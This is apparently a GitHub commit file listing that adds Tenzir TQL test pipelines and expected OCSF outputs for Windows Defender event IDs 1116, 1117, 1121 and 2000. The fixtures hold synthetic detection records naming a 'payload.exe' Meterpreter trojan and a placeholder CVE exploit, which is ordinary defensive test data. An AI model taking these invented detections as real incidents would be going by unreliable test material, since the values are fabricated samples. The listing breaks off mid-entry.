    {
      "sha": "9d72ab81eac871008ad8821fac663953a519b3a1",
      "filename": "microsoft/tests/ocsf/eid-1116.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-1116.tql",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-1116.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-1116.tql?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/eid-1116.xml\" {\n+  read_all\n+}\n+microsoft::windows::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "4461fa034f9af2ebd37b6e70c90fd51266746667",
      "filename": "microsoft/tests/ocsf/eid-1116.txt",
      "status": "added",
      "additions": 111,
      "deletions": 0,
      "changes": 111,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-1116.txt",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-1116.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-1116.txt?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,111 @@\n+{\n+  activity_id: 1,\n+  activity_name: \"Create\",\n+  actor: {\n+    process: {\n+      file: {\n+        name: \"payload.exe\",\n+        path: \"C:\\\\tmp\\\\payload.exe\",\n+        type: \"Regular File\",\n+        type_id: 1,\n+      },\n+      name: \"payload.exe\",\n+      path: \"C:\\\\tmp\\\\payload.exe\",\n+    },\n+    user: {\n+      domain: \"CORP\",\n+      name: \"jdoe\",\n+    },\n+  },\n+  category_name: \"Findings\",\n+  category_uid: 2,\n+  class_name: \"Detection Finding\",\n+  class_uid: 2004,\n+  device: {\n+    hostname: \"WINHOST01.corp.local\",\n+  },\n+  disposition: \"No Action\",\n+  disposition_id: 16,\n+  evidences: [\n+    {\n+      file: {\n+        name: \"payload.exe\",\n+        path: \"C:\\\\tmp\\\\payload.exe\",\n+        type: \"Regular File\",\n+        type_id: 1,\n+      },\n+    },\n+  ],\n+  finding_info: {\n+    title: \"Trojan:Win32/Meterpreter.A!MSR\",\n+    types: [\n+      \"Trojan\",\n+    ],\n+    uid: \"{A1B2C3D4-E5F6-7A8B-9C0D-1E2F3A4B5C6D}\",\n+  },\n+  malware: [\n+    {\n+      name: \"Trojan:Win32/Meterpreter.A!MSR\",\n+    },\n+  ],\n+  metadata: {\n+    event_code: \"1116\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"3\",\n+    log_name: \"Microsoft-Windows-Windows Defender/Operational\",\n+    log_version: \"0\",\n+    logged_time: 2024-03-23T12:34:56.789012300Z,\n+    original_event_uid: \"41116\",\n+    product: {\n+      name: \"Microsoft-Windows-Windows Defender\",\n+      uid: \"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+      \"security_control\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Windows Defender\\\" Guid=\\\"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\\\"/>\\n    <EventID>1116</EventID>\\n    <Version>0</Version>\\n    <Level>3</Level>\\n    <Task>0</Task>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2024-03-23T12:34:56.789012300Z\\\"/>\\n    <EventRecordID>41116</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3120\\\" ThreadID=\\\"4056\\\"/>\\n    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>\\n    <Computer>WINHOST01.corp.local</Computer>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"Product Name\\\">Windows Defender Antivirus</Data>\\n    <Data Name=\\\"Product Version\\\">4.18.24010.12</Data>\\n    <Data Name=\\\"Detection ID\\\">{A1B2C3D4-E5F6-7A8B-9C0D-1E2F3A4B5C6D}</Data>\\n    <Data Name=\\\"Detection Time\\\">2024-03-23T12:34:56.789012300Z</Data>\\n    <Data Name=\\\"Unused\\\"></Data>\\n    <Data Name=\\\"Unused2\\\"></Data>\\n    <Data Name=\\\"Threat ID\\\">2147735503</Data>\\n    <Data Name=\\\"Threat Name\\\">Trojan:Win32/Meterpreter.A!MSR</Data>\\n    <Data Name=\\\"Severity ID\\\">5</Data>\\n    <Data Name=\\\"Severity Name\\\">Severe</Data>\\n    <Data Name=\\\"Category ID\\\">8</Data>\\n    <Data Name=\\\"Category Name\\\">Trojan</Data>\\n    <Data Name=\\\"FWLink\\\">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:Win32/Meterpreter.A!MSR&amp;threatid=2147735503</Data>\\n    <Data Name=\\\"Status Code\\\">1</Data>\\n    <Data Name=\\\"Status Description\\\"></Data>\\n    <Data Name=\\\"State\\\">1</Data>\\n    <Data Name=\\\"Source ID\\\">4</Data>\\n    <Data Name=\\\"Source Name\\\">Real-time Protection</Data>\\n    <Data Name=\\\"Process Name\\\">C:\\\\tmp\\\\payload.exe</Data>\\n    <Data Name=\\\"Detection User\\\">CORP\\\\jdoe</Data>\\n    <Data Name=\\\"Unused3\\\"></Data>\\n    <Data Name=\\\"Path\\\">C:\\\\tmp\\\\payload.exe</Data>\\n    <Data Name=\\\"Origin ID\\\">1</Data>\\n    <Data Name=\\\"Origin Name\\\">Local machine</Data>\\n    <Data Name=\\\"Execution ID\\\">1</Data>\\n    <Data Name=\\\"Execution Name\\\">Suspended</Data>\\n    <Data Name=\\\"Type ID\\\">0</Data>\\n    <Data Name=\\\"Type Name\\\">Concrete</Data>\\n    <Data Name=\\\"Pre Execution Status\\\">0</Data>\\n    <Data Name=\\\"Action ID\\\">9</Data>\\n    <Data Name=\\\"Action Name\\\">Not Applicable</Data>\\n    <Data Name=\\\"Remediation User\\\"></Data>\\n    <Data Name=\\\"Security intelligence Version\\\">1.405.12.0</Data>\\n    <Data Name=\\\"Engine Version\\\">1.1.24010.10</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 2346,\n+  severity: \"Critical\",\n+  severity_id: 5,\n+  time: 2024-03-23T12:34:56.789012300Z,\n+  type_name: \"Detection Finding: Create\",\n+  type_uid: 200401,\n+  unmapped: {\n+    System: {\n+      Task: 0,\n+      Keywords: \"0x8000000000000000\",\n+      Correlation: null,\n+      Execution: {\n+        ProcessID: 3120,\n+        ThreadID: 4056,\n+      },\n+    },\n+    EventData: {\n+      \"Product Name\": \"Windows Defender Antivirus\",\n+      \"Product Version\": \"4.18.24010.12\",\n+      \"Detection Time\": 2024-03-23T12:34:56.789012300Z,\n+      \"Threat ID\": 2147735503,\n+      \"Category ID\": 8,\n+      FWLink: \"https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Meterpreter.A!MSR&threatid=2147735503\",\n+      \"Status Code\": 1,\n+      State: 1,\n+      \"Source ID\": 4,\n+      \"Source Name\": \"Real-time Protection\",\n+      \"Origin ID\": 1,\n+      \"Execution ID\": 1,\n+      \"Type ID\": 0,\n+      \"Pre Execution Status\": 0,\n+      \"Security intelligence Version\": \"1.405.12.0\",\n+      \"Engine Version\": \"1.1.24010.10\",\n+    },\n+  },\n+}"
    },
    {
      "sha": "17244a90e6609b583342e1ae239be6949f2b2c7b",
      "filename": "microsoft/tests/ocsf/eid-1117.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-1117.tql",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-1117.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-1117.tql?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/eid-1117.xml\" {\n+  read_all\n+}\n+microsoft::windows::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "076a9acb016caedac1226b3ff87a8fa2bf966805",
      "filename": "microsoft/tests/ocsf/eid-1117.txt",
      "status": "added",
      "additions": 111,
      "deletions": 0,
      "changes": 111,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-1117.txt",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-1117.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-1117.txt?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,111 @@\n+{\n+  activity_id: 1,\n+  activity_name: \"Create\",\n+  actor: {\n+    process: {\n+      file: {\n+        name: \"payload.exe\",\n+        path: \"C:\\\\tmp\\\\payload.exe\",\n+        type: \"Regular File\",\n+        type_id: 1,\n+      },\n+      name: \"payload.exe\",\n+      path: \"C:\\\\tmp\\\\payload.exe\",\n+    },\n+    user: {\n+      domain: \"CORP\",\n+      name: \"jdoe\",\n+    },\n+  },\n+  category_name: \"Findings\",\n+  category_uid: 2,\n+  class_name: \"Detection Finding\",\n+  class_uid: 2004,\n+  device: {\n+    hostname: \"WINHOST01.corp.local\",\n+  },\n+  disposition: \"Quarantined\",\n+  disposition_id: 3,\n+  evidences: [\n+    {\n+      file: {\n+        name: \"payload.exe\",\n+        path: \"C:\\\\tmp\\\\payload.exe\",\n+        type: \"Regular File\",\n+        type_id: 1,\n+      },\n+    },\n+  ],\n+  finding_info: {\n+    title: \"Trojan:Win32/Meterpreter.A!MSR\",\n+    types: [\n+      \"Trojan\",\n+    ],\n+    uid: \"{A1B2C3D4-E5F6-7A8B-9C0D-1E2F3A4B5C6D}\",\n+  },\n+  malware: [\n+    {\n+      name: \"Trojan:Win32/Meterpreter.A!MSR\",\n+    },\n+  ],\n+  metadata: {\n+    event_code: \"1117\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"4\",\n+    log_name: \"Microsoft-Windows-Windows Defender/Operational\",\n+    log_version: \"0\",\n+    logged_time: 2024-03-23T12:34:58.123456700Z,\n+    original_event_uid: \"41117\",\n+    product: {\n+      name: \"Microsoft-Windows-Windows Defender\",\n+      uid: \"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+      \"security_control\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Windows Defender\\\" Guid=\\\"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\\\"/>\\n    <EventID>1117</EventID>\\n    <Version>0</Version>\\n    <Level>4</Level>\\n    <Task>0</Task>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2024-03-23T12:34:58.123456700Z\\\"/>\\n    <EventRecordID>41117</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3120\\\" ThreadID=\\\"4056\\\"/>\\n    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>\\n    <Computer>WINHOST01.corp.local</Computer>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"Product Name\\\">Windows Defender Antivirus</Data>\\n    <Data Name=\\\"Product Version\\\">4.18.24010.12</Data>\\n    <Data Name=\\\"Detection ID\\\">{A1B2C3D4-E5F6-7A8B-9C0D-1E2F3A4B5C6D}</Data>\\n    <Data Name=\\\"Detection Time\\\">2024-03-23T12:34:56.789012300Z</Data>\\n    <Data Name=\\\"Unused\\\"></Data>\\n    <Data Name=\\\"Unused2\\\"></Data>\\n    <Data Name=\\\"Threat ID\\\">2147735503</Data>\\n    <Data Name=\\\"Threat Name\\\">Trojan:Win32/Meterpreter.A!MSR</Data>\\n    <Data Name=\\\"Severity ID\\\">5</Data>\\n    <Data Name=\\\"Severity Name\\\">Severe</Data>\\n    <Data Name=\\\"Category ID\\\">8</Data>\\n    <Data Name=\\\"Category Name\\\">Trojan</Data>\\n    <Data Name=\\\"FWLink\\\">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:Win32/Meterpreter.A!MSR&amp;threatid=2147735503</Data>\\n    <Data Name=\\\"Status Code\\\">1</Data>\\n    <Data Name=\\\"Status Description\\\"></Data>\\n    <Data Name=\\\"State\\\">2</Data>\\n    <Data Name=\\\"Source ID\\\">4</Data>\\n    <Data Name=\\\"Source Name\\\">Real-time Protection</Data>\\n    <Data Name=\\\"Process Name\\\">C:\\\\tmp\\\\payload.exe</Data>\\n    <Data Name=\\\"Detection User\\\">CORP\\\\jdoe</Data>\\n    <Data Name=\\\"Unused3\\\"></Data>\\n    <Data Name=\\\"Path\\\">C:\\\\tmp\\\\payload.exe</Data>\\n    <Data Name=\\\"Origin ID\\\">1</Data>\\n    <Data Name=\\\"Origin Name\\\">Local machine</Data>\\n    <Data Name=\\\"Execution ID\\\">1</Data>\\n    <Data Name=\\\"Execution Name\\\">Suspended</Data>\\n    <Data Name=\\\"Type ID\\\">0</Data>\\n    <Data Name=\\\"Type Name\\\">Concrete</Data>\\n    <Data Name=\\\"Pre Execution Status\\\">0</Data>\\n    <Data Name=\\\"Action ID\\\">2</Data>\\n    <Data Name=\\\"Action Name\\\">Quarantine</Data>\\n    <Data Name=\\\"Remediation User\\\">NT AUTHORITY\\\\SYSTEM</Data>\\n    <Data Name=\\\"Security intelligence Version\\\">1.405.12.0</Data>\\n    <Data Name=\\\"Engine Version\\\">1.1.24010.10</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 2361,\n+  severity: \"Critical\",\n+  severity_id: 5,\n+  time: 2024-03-23T12:34:58.123456700Z,\n+  type_name: \"Detection Finding: Create\",\n+  type_uid: 200401,\n+  unmapped: {\n+    System: {\n+      Task: 0,\n+      Keywords: \"0x8000000000000000\",\n+      Correlation: null,\n+      Execution: {\n+        ProcessID: 3120,\n+        ThreadID: 4056,\n+      },\n+    },\n+    EventData: {\n+      \"Product Name\": \"Windows Defender Antivirus\",\n+      \"Product Version\": \"4.18.24010.12\",\n+      \"Detection Time\": 2024-03-23T12:34:56.789012300Z,\n+      \"Threat ID\": 2147735503,\n+      \"Category ID\": 8,\n+      FWLink: \"https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Meterpreter.A!MSR&threatid=2147735503\",\n+      \"Status Code\": 1,\n+      State: 2,\n+      \"Source ID\": 4,\n+      \"Source Name\": \"Real-time Protection\",\n+      \"Origin ID\": 1,\n+      \"Execution ID\": 1,\n+      \"Type ID\": 0,\n+      \"Pre Execution Status\": 0,\n+      \"Security intelligence Version\": \"1.405.12.0\",\n+      \"Engine Version\": \"1.1.24010.10\",\n+    },\n+  },\n+}"
    },
    {
      "sha": "a97a15885c6853f7ccb969b8945c9a021ea0105b",
      "filename": "microsoft/tests/ocsf/eid-1121.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-1121.tql",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-1121.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-1121.tql?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/eid-1121.xml\" {\n+  read_all\n+}\n+microsoft::windows::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "ae91e6fdb5df4294aed90cfd9ca3df5015c5e734",
      "filename": "microsoft/tests/ocsf/eid-1121.txt",
      "status": "added",
      "additions": 106,
      "deletions": 0,
      "changes": 106,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-1121.txt",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-1121.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-1121.txt?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,106 @@\n+{\n+  activity_id: 1,\n+  activity_name: \"Create\",\n+  actor: {\n+    process: {\n+      file: {\n+        name: \"payload.exe\",\n+        path: \"C:\\\\tmp\\\\payload.exe\",\n+        type: \"Regular File\",\n+        type_id: 1,\n+      },\n+      name: \"payload.exe\",\n+      path: \"C:\\\\tmp\\\\payload.exe\",\n+    },\n+    user: {\n+      domain: \"CORP\",\n+      name: \"jdoe\",\n+    },\n+  },\n+  category_name: \"Findings\",\n+  category_uid: 2,\n+  class_name: \"Detection Finding\",\n+  class_uid: 2004,\n+  device: {\n+    hostname: \"WINHOST01.corp.local\",\n+  },\n+  disposition: \"Blocked\",\n+  disposition_id: 2,\n+  evidences: [\n+    {\n+      file: {\n+        hashes: [\n+          {\n+            algorithm: \"SHA-256\",\n+            algorithm_id: 3,\n+            value: \"AABBCCDDEEFF00112233445566778899AABBCCDDEEFF00112233445566778899\",\n+          },\n+        ],\n+        name: \"payload.exe\",\n+        path: \"C:\\\\tmp\\\\payload.exe\",\n+        type: \"Regular File\",\n+        type_id: 1,\n+      },\n+    },\n+  ],\n+  finding_info: {\n+    desc: \"Block process creations originating from PSExec and WMI commands\",\n+    title: \"Exploit:Win32/CVE-2024-99999\",\n+    types: [\n+      \"ASR Rule Block\",\n+    ],\n+    uid: \"d4f940ab-401b-4efc-aadc-ad5f3c50688a\",\n+  },\n+  malware: [\n+    {\n+      name: \"Exploit:Win32/CVE-2024-99999\",\n+    },\n+  ],\n+  metadata: {\n+    event_code: \"1121\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"3\",\n+    log_name: \"Microsoft-Windows-Windows Defender/Operational\",\n+    log_version: \"0\",\n+    logged_time: 2024-03-23T12:34:56.789012300Z,\n+    original_event_uid: \"41121\",\n+    product: {\n+      name: \"Microsoft-Windows-Windows Defender\",\n+      uid: \"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+      \"security_control\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Windows Defender\\\" Guid=\\\"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\\\"/>\\n    <EventID>1121</EventID>\\n    <Version>0</Version>\\n    <Level>3</Level>\\n    <Task>0</Task>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2024-03-23T12:34:56.789012300Z\\\"/>\\n    <EventRecordID>41121</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3120\\\" ThreadID=\\\"4056\\\"/>\\n    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>\\n    <Computer>WINHOST01.corp.local</Computer>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"Company name\\\">Windows Defender Antivirus</Data>\\n    <Data Name=\\\"Process name\\\">C:\\\\tmp\\\\payload.exe</Data>\\n    <Data Name=\\\"Path\\\">C:\\\\tmp\\\\payload.exe</Data>\\n    <Data Name=\\\"Hashes\\\">SHA256=AABBCCDDEEFF00112233445566778899AABBCCDDEEFF00112233445566778899</Data>\\n    <Data Name=\\\"User\\\">CORP\\\\jdoe</Data>\\n    <Data Name=\\\"Current Platform Version\\\">4.18.24010.12</Data>\\n    <Data Name=\\\"Threat Resource Path\\\">C:\\\\tmp\\\\payload.exe</Data>\\n    <Data Name=\\\"Threat Name\\\">Exploit:Win32/CVE-2024-99999</Data>\\n    <Data Name=\\\"Rule ID\\\">d4f940ab-401b-4efc-aadc-ad5f3c50688a</Data>\\n    <Data Name=\\\"Rule Name\\\">Block process creations originating from PSExec and WMI commands</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1331,\n+  severity: \"High\",\n+  severity_id: 4,\n+  time: 2024-03-23T12:34:56.789012300Z,\n+  type_name: \"Detection Finding: Create\",\n+  type_uid: 200401,\n+  unmapped: {\n+    System: {\n+      Task: 0,\n+      Keywords: \"0x8000000000000000\",\n+      Correlation: null,\n+      Execution: {\n+        ProcessID: 3120,\n+        ThreadID: 4056,\n+      },\n+    },\n+    EventData: {\n+      \"Company name\": \"Windows Defender Antivirus\",\n+      \"Current Platform Version\": \"4.18.24010.12\",\n+      \"Threat Resource Path\": \"C:\\\\tmp\\\\payload.exe\",\n+    },\n+  },\n+}"
    },
    {
      "sha": "0192d18e0d381d27403cc3d35d90aeac2e88e095",
      "filename": "microsoft/tests/ocsf/eid-2000.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-2000.tql",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-2000.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-2000.tql?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/eid-2000.xml\" {\n+  read_all\n+}\n+microsoft::windows::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "c2af5bdc6dad9fcdd51244a48db2886c5f969baa",
      "filename": "microsoft/tests/ocsf/eid-2000.txt",
      "status": "added",
      "additions": 64,
      "deletions": 0,
      "changes": 64,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-2000.txt",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-2000.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-2000.txt?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,64 @@\n+{\n+  activity_id: 0,\n+  activity_name: \"Unknown\",\n+  category_name: \"Uncategorized\",\n+  category_uid: 0,\n+  class_name: \"Base Event\",\n+  class_uid: 0,\n+  device: {\n+    hostname: \"WINHOST01.corp.local\",\n+  },\n+  metadata: {\n+    event_code: \"2000\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"4\",\n+    log_name: \"Microsoft-Windows-Windows Defender/Operational\",\n+    log_version: \"0\",\n+    logged_time: 2024-03-23T12:35:01Z,\n+    original_event_uid: \"42000\",\n+    product: {\n+      name: \"Microsoft-Windows-Windows Defender\",\n+      uid: \"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Windows Defender\\\" Guid=\\\"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\\\"/>\\n    <EventID>2000</EventID>\\n    <Version>0</Version>\\n    <Level>4</Level>\\n    <Task>0</Task>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2024-03-23T12:35:01.000000000Z\\\"/>\\n    <EventRecordID>42000</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3120\\\" ThreadID=\\\"4056\\\"/>\\n    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>\\n    <Computer>WINHOST01.corp.local</Computer>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"Current Signature Version\\\">1.405.12.0</Data>\\n    <Data Name=\\\"Previous Signature Version\\\">1.405.11.0</Data>\\n    <Data Name=\\\"Update Source\\\">Microsoft Malware Protection Center</Data>\\n    <Data Name=\\\"Update Stage\\\">Install</Data>\\n    <Data Name=\\\"Source Path\\\">https://go.microsoft.com/fwlink/?linkid=74005</Data>\\n    <Data Name=\\\"Signature Type\\\">AntiVirus</Data>\\n    <Data Name=\\\"Update Type\\\">Full</Data>\\n    <Data Name=\\\"User\\\">NT AUTHORITY\\\\SYSTEM</Data>\\n    <Data Name=\\\"Current Engine Version\\\">1.1.24010.10</Data>\\n    <Data Name=\\\"Previous Engine Version\\\">1.1.24010.10</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1245,\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  time: 2024-03-23T12:35:01Z,\n+  type_name: \"Base Event: Unknown\",\n+  type_uid: 0,\n+  unmapped: {\n+    System: {\n+      Task: 0,\n+      Keywords: \"0x8000000000000000\",\n+      Correlation: null,\n+      Execution: {\n+        ProcessID: 3120,\n+        ThreadID: 4056,\n+      },\n+    },\n+    EventData: {\n+      \"Current Signature Version\": \"1.405.12.0\",\n+      \"Previous Signature Version\": \"1.405.11.0\",\n+      \"Update Source\": \"Microsoft Malware Protection Center\",\n+      \"Update Stage\": \"Install\",\n+      \"Source Path\": \"https://go.microsoft.com/fwlink/?linkid=74005\",\n+      \"Signature Type\": \"AntiVirus\",\n+      \"Update Type\": \"Full\",\n+      User: \"NT AUTHORITY\\\\SYSTEM\",\n+      \"Current Engine Version\": \"1.1.24010.10\",\n+      \"Previous Engine Version\": \"1.1.24010.10\",\n+    },\n+  },\n+}"
    },
    {
      "sha": "51fad1c87be2fd31a4940444e3490f5026f48793",
      "filename": "microsoft/tests/ocsf/eid-4100.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4100.tql",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4100.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-4100.tql?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/eid-4100.xml\" {\n+  read_all\n+}\n+microsoft::windows::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "1ecd0a1816925432cc79670b951e37bd69c560b4",
      "filename": "microsoft/tests/ocsf/eid-4100.txt",
      "status": "added",
      "additions": 87,
      "deletions": 0,
      "changes": 87,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4100.txt",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4100.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-4100.txt?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
